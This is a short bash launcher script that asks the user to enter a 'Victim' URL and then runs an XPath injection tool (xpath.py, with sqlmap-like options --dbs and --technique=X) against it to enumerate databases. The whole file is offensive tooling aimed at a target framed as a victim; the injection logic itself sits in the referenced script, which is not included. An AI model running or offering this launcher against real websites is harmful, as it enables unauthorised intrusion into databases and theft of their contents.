#!/bin/bash
echo -ne "[+] Enter Victim in Absolute Parameter Format: "
read Victim
cd Xpath
python2 xpath.py -u "$Victim" --dbs --technique=X
